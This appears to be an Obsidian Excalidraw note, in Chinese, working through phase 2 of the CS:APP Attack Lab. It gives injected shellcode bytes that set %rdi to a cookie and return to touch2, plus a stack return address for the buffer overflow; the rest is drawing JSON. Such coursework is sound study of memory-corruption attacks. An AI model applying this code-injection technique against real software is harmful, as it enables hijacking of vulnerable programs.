---

excalidraw-plugin: parsed
tags: [excalidraw]

---
==⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠==


# Text Elements
与 level1 类似，将 getbuf 的返回值变为 touch2，
不同的是 touch2 需要传递一个参数，
因此我们构造出下面的汇编代码 ^uVCiOOPB

0000000000000000 <.text>:
   0:        68 ec 17 49 00               pushq  $0x4917ec
   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi
   c:        c3                           retq ^XSvY66vt

首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码  ^0T2AD1iV


# Embedded files
efbffb83894057343fb882506e43a242d65043d7: [[Pasted Image 20230207143013_778.png]]
4c909bc40269cecb2045e7a53d9e430cfd43ab97: [[Pasted Image 20230207143116_809.png]]
0ab8c93e3eb3ad970cd8ac6052090b9bf8b21a3e: [[Pasted Image 20230207134810_252.png]]
580b99fc879ae4eaa9e79aad0e42f8da2f2dec35: [[Pasted Image 20230207143941_134.png]]

%%
# Drawing
```json
{
	"type": "excalidraw",
	"version": 2,
	"source": "https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/2.0.1",
	"elements": [
		{
			"type": "image",
			"version": 8,
			"versionNonce": 1649812256,
			"isDeleted": false,
			"id": "_7zW5EsneoyTZv8necwm6",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": -561.2447780837986,
			"y": -164.3999745383232,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 541.7912165499625,
			"height": 179.0920965817932,
			"seed": 942499554,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "efbffb83894057343fb882506e43a242d65043d7",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "image",
			"version": 152,
			"versionNonce": 803806944,
			"isDeleted": false,
			"id": "5dA8I1GNyOEsW-o7AridK",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": -559.5053956347106,
			"y": 51.707425735841724,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 589.8032814541727,
			"height": 239.60758309075766,
			"seed": 1556043106,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "4c909bc40269cecb2045e7a53d9e430cfd43ab97",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "image",
			"version": 204,
			"versionNonce": 1977925408,
			"isDeleted": false,
			"id": "d2kQpJvNfFhq9O0FgMKUI",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": -561.3304386956329,
			"y": -400.09802284682655,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 540.2573063033127,
			"height": 212.72631435692938,
			"seed": 777177570,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "0ab8c93e3eb3ad970cd8ac6052090b9bf8b21a3e",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "arrow",
			"version": 310,
			"versionNonce": 1461863136,
			"isDeleted": false,
			"id": "th5UNI7AY-p0rOalADcRi",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": -186.0032794952761,
			"y": -350.98951837375,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"width": 295.8152499948954,
			"height": 70.41135851967454,
			"seed": 1449510462,
			"groupIds": [],
			"frameId": null,
			"roundness": {
				"type": 2
			},
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"startBinding": null,
			"endBinding": {
				"elementId": "uVCiOOPB",
				"focus": -0.3961647047422323,
				"gap": 3.403954660006974
			},
			"lastCommittedPoint": null,
			"startArrowhead": null,
			"endArrowhead": "triangle",
			"points": [
				[
					0,
					0
				],
				[
					295.8152499948954,
					70.41135851967454
				]
			]
		},
		{
			"type": "text",
			"version": 283,
			"versionNonce": 1430248224,
			"isDeleted": false,
			"id": "uVCiOOPB",
			"fillStyle": "hachure",
			"strokeWidth": 1,
			"strokeStyle": "solid",
			"roughness": 1,
			"opacity": 100,
			"angle": 0,
			"x": 113.21592515962635,
			"y": -307.0742000773794,
			"strokeColor": "#000000",
			"backgroundColor": "transparent",
			"width": 435.693359375,
			"height": 69,
			"seed": 855860386,
			"groupIds": [
				"7Jt7kUPltY4dnMMTC7-FS"
			],
			"frameId": null,
			"roundness": null,
			"boundElements": [
				{
					"id": "th5UNI7AY-p0rOalADcRi",
					"type": "arrow"
				}
			],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"customData": {
				"legacyTextWrap": true
			},
			"fontSize": 20,
			"fontFamily": 2,
			"text": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码",
			"rawText": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码",
			"textAlign": "left",
			"verticalAlign": "top",
			"containerId": null,
			"originalText": "与 level1 类似，将 getbuf 的返回值变为 touch2，\n不同的是 touch2 需要传递一个参数，\n因此我们构造出下面的汇编代码",
			"lineHeight": 1.15,
			"baseline": 65
		},
		{
			"type": "text",
			"version": 241,
			"versionNonce": 60221152,
			"isDeleted": false,
			"id": "XSvY66vt",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": 105.843311413815,
			"y": -201.3629561412553,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"width": 600.99609375,
			"height": 75.77208525937338,
			"seed": 551140094,
			"groupIds": [
				"7Jt7kUPltY4dnMMTC7-FS"
			],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"fontSize": 15.785851095702789,
			"fontFamily": 3,
			"text": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq",
			"rawText": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq",
			"textAlign": "left",
			"verticalAlign": "top",
			"containerId": null,
			"originalText": "0000000000000000 <.text>:\n   0:        68 ec 17 49 00               pushq  $0x4917ec\n   5:        48 c7 c7 fa 97 b9 59         mov    $0x59b997fa,%rdi\n   c:        c3                           retq",
			"lineHeight": 1.2,
			"baseline": 72
		},
		{
			"type": "image",
			"version": 343,
			"versionNonce": 1389852448,
			"isDeleted": false,
			"id": "On8eO1i5_exTfQcFCz14_",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": 164.18285661695302,
			"y": -91.22744451011337,
			"strokeColor": "transparent",
			"backgroundColor": "transparent",
			"width": 460.0971691472244,
			"height": 239.2223011363636,
			"seed": 801419518,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"status": "pending",
			"fileId": "580b99fc879ae4eaa9e79aad0e42f8da2f2dec35",
			"scale": [
				1,
				1
			]
		},
		{
			"type": "text",
			"version": 189,
			"versionNonce": 30870240,
			"isDeleted": false,
			"id": "0T2AD1iV",
			"fillStyle": "hachure",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": 0,
			"opacity": 100,
			"angle": 0,
			"x": 143.9967205047243,
			"y": 196.08079412625034,
			"strokeColor": "#c92a2a",
			"backgroundColor": "transparent",
			"width": 806.09375,
			"height": 24,
			"seed": 1145557374,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"boundElements": [],
			"updated": 1677455357176,
			"link": null,
			"locked": false,
			"fontSize": 20,
			"fontFamily": 3,
			"text": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 ",
			"rawText": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 ",
			"textAlign": "left",
			"verticalAlign": "top",
			"containerId": null,
			"originalText": "首先将 getbuf 返回地址设置为 0x5561dc78 即栈上的地址。然后在栈上构造上述代码 ",
			"lineHeight": 1.2,
			"baseline": 20
		},
		{
			"id": "E7OaUpDutcxVE4Fq1JUzh",
			"type": "freedraw",
			"x": 759.2825192706164,
			"y": -247.05442752353085,
			"width": 38.99733907334803,
			"height": 82.76986252302444,
			"angle": 0,
			"strokeColor": "#FFC47C",
			"backgroundColor": "#FFC47C",
			"fillStyle": "solid",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": null,
			"opacity": 20,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"seed": 24736422,
			"version": 15,
			"versionNonce": 493043962,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1700303487160,
			"link": null,
			"locked": false,
			"customData": {
				"strokeOptions": {
					"highlighter": true,
					"constantPressure": true,
					"hasOutline": true,
					"outlineWidth": 4,
					"options": {
						"thinning": 1,
						"smoothing": 0.5,
						"streamline": 0.5,
						"easing": "linear",
						"start": {
							"taper": 0,
							"cap": true,
							"easing": "linear"
						},
						"end": {
							"taper": 0,
							"cap": true,
							"easing": "linear"
						}
					}
				}
			},
			"points": [
				[
					0,
					0
				],
				[
					7.9586406272138674,
					11.93796094082083
				],
				[
					15.121417191706314,
					24.67178594436305
				],
				[
					20.692465630756033,
					38.99733907334803
				],
				[
					24.671785944363023,
					50.139435951447496
				],
				[
					31.038698446134163,
					66.85258126859665
				],
				[
					33.42629063429831,
					74.01535783308915
				],
				[
					35.81388282246246,
					77.99467814669609
				],
				[
					36.60974688518388,
					79.58640627213887
				],
				[
					37.4056109479053,
					81.97399846030302
				],
				[
					38.99733907334803,
					82.76986252302444
				],
				[
					38.99733907334803,
					82.76986252302444
				]
			],
			"pressures": [
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				0
			],
			"simulatePressure": false,
			"lastCommittedPoint": [
				38.99733907334803,
				82.76986252302444
			]
		},
		{
			"id": "gTVlnFqriUBAD7TUVx3yv",
			"type": "freedraw",
			"x": 794.3005380303574,
			"y": -251.82961189985917,
			"width": 51.73116407689031,
			"height": 81.17813439758163,
			"angle": 0,
			"strokeColor": "#FFC47C",
			"backgroundColor": "#FFC47C",
			"fillStyle": "solid",
			"strokeWidth": 2,
			"strokeStyle": "solid",
			"roughness": null,
			"opacity": 20,
			"groupIds": [],
			"frameId": null,
			"roundness": null,
			"seed": 874464742,
			"version": 33,
			"versionNonce": 1311302566,
			"isDeleted": true,
			"boundElements": null,
			"updated": 1700303487160,
			"link": null,
			"locked": false,
			"customData": {
				"strokeOptions": {
					"highlighter": true,
					"constantPressure": true,
					"hasOutline": true,
					"outlineWidth": 4,
					"options": {
						"thinning": 1,
						"smoothing": 0.5,
						"streamline": 0.5,
						"easing": "linear",
						"start": {
							"taper": 0,
							"cap": true,
							"easing": "linear"
						},
						"end": {
							"taper": 0,
							"cap": true,
							"easing": "linear"
						}
					}
				}
			},
			"points": [
				[
					0,
					0
				],
				[
					0.7958640627214209,
					0
				],
				[
					3.1834562508855697,
					3.1834562508855413
				],
				[
					4.775184376328411,
					7.162776564492503
				],
				[
					7.16277656449256,
					13.529689066263614
				],
				[
					8.754504689935288,
					19.100737505313333
				],
				[
					13.5296890662637,
					27.0593781325272
				],
				[
					17.509009379870577,
					31.038698446134163
				],
				[
					20.692465630756146,
					33.42629063429831
				],
				[
					23.875921881641716,
					35.81388282246249
				],
				[
					25.467650007084444,
					36.60974688518388
				],
				[
					28.651106257970014,
					36.60974688518388
				],
				[
					31.834562508855583,
					36.60974688518388
				],
				[
					35.813882822462574,
					36.60974688518388
				],
				[
					38.99733907334803,
					35.81388282246249
				],
				[
					42.1807953242336,
					33.42629063429831
				],
				[
					43.77252344967644,
					31.834562508855555
				],
				[
					46.16011563784059,
					29.446970320691378
				],
				[
					48.54770782600474,
					26.263514069805808
				],
				[
					50.93530001416889,
					23.87592188164166
				],
				[
					51.73116407689031,
					23.87592188164166
				],
				[
					51.73116407689031,
					25.467650007084444
				],
				[
					51.73116407689031,
					26.263514069805808
				],
				[
					47.75184376328332,
					38.20147501062664
				],
				[
					43.77252344967644,
					47.75184376328332
				],
				[
					38.99733907334803,
					56.50634845321858
				],
				[
					32.630426571577004,
					66.85258126859665
				],
				[
					25.467650007084444,
					74.81122189581052
				],
				[
					17.509009379870577,
					81.17813439758163
				],
				[
					17.509009379870577,
					81.17813439758163
				]
			],
			"pressures": [
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				1,
				0
			],
			"simulatePressure": false,
			"lastCommittedPoint": [
				17.509009379870577,
				81.17813439758163
			]
		}
	],
	"appState": {
		"theme": "light",
		"viewBackgroundColor": "#ffffff",
		"currentItemStrokeColor": "#FFC47C",
		"currentItemBackgroundColor": "#FFC47C",
		"currentItemFillStyle": "solid",
		"currentItemStrokeWidth": 2,
		"currentItemStrokeStyle": "solid",
		"currentItemRoughness": null,
		"currentItemOpacity": 100,
		"currentItemFontFamily": 3,
		"currentItemFontSize": 20,
		"currentItemTextAlign": "left",
		"currentItemStartArrowhead": null,
		"currentItemEndArrowhead": "triangle",
		"scrollX": -41.015202664563155,
		"scrollY": 422.9403853849577,
		"zoom": {
			"value": 1.2564959857347826
		},
		"currentItemRoundness": "round",
		"gridSize": null,
		"gridColor": {
			"Bold": "#C9C9C9FF",
			"Regular": "#EDEDEDFF"
		},
		"colorPalette": {},
		"currentStrokeOptions": {
			"highlighter": true,
			"constantPressure": true,
			"hasOutline": true,
			"outlineWidth": 4,
			"options": {
				"thinning": 1,
				"smoothing": 0.5,
				"streamline": 0.5,
				"easing": "linear",
				"start": {
					"taper": 0,
					"cap": true,
					"easing": "linear"
				},
				"end": {
					"taper": 0,
					"cap": true,
					"easing": "linear"
				}
			}
		},
		"previousGridSize": null,
		"frameRendering": {
			"enabled": true,
			"clip": true,
			"name": true,
			"outline": true
		}
	},
	"files": {}
}
```
%%